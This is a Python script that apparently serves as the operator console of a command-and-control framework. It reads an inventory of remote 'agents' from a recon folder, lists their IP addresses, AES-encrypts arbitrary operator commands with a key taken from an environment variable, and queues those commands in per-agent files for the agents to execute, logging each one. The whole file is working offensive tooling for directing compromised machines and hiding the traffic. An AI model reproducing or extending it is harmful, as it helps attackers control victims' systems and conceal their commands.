import os
import json
import argparse
import datetime
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AGENT_PATH = "recon/agent_inventory.json"
QUEUE_DIR = "c2/queues"
LOG_DIR = "results"
KEY_ENV = "C2_AES_KEY"

os.makedirs(QUEUE_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

def load_agents():
    if not os.path.exists(AGENT_PATH):
        return {}
    with open(AGENT_PATH, "r") as f:
        return json.load(f)

def list_agents(agents):
    for idx, (agent, data) in enumerate(agents.items(), 1):
        print(f"{idx}. {agent} ({data.get('ip', 'unknown')})")

def encrypt_command(command, key):
    key_bytes = hashlib.sha256(key.encode()).digest()
    cipher = AES.new(key_bytes, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(command.encode(), AES.block_size))
    iv = cipher.iv
    encrypted = base64.b64encode(iv + ct_bytes).decode()
    return encrypted

def write_command(agent, command, encrypted=False):
    fname = os.path.join(QUEUE_DIR, f"{agent}.queue")
    with open(fname, "a") as f:
        f.write(command + "\n")

    logname = f"{LOG_DIR}/c2_commands_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.log"
    with open(logname, "a") as f:
        f.write(f"{datetime.datetime.now().isoformat()} - {agent} - {command}\n")

def main():
    parser = argparse.ArgumentParser(description="Send command to remote agent")
    parser.add_argument("--agent", help="Agent ID (from inventory)")
    parser.add_argument("--cmd", help="Command to execute")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt command with AES key")
    parser.add_argument("--list", action="store_true", help="List available agents")

    args = parser.parse_args()
    agents = load_agents()

    if args.list:
        if not agents:
            print("[!] No agents found.")
            return
        list_agents(agents)
        return

    if not args.agent or not args.cmd:
        print("[!] --agent and --cmd are required unless using --list")
        return

    if args.agent not in agents:
        print(f"[!] Agent '{args.agent}' not found.")
        return

    final_cmd = args.cmd
    if args.encrypt:
        key = os.environ.get(KEY_ENV)
        if not key:
            print(f"[!] AES key not found. Set env variable: {KEY_ENV}")
            return
        final_cmd = encrypt_command(args.cmd, key)

    write_command(args.agent, final_cmd)
    print(f"[+] Command sent to agent: {args.agent}")

if __name__ == "__main__":
    main()
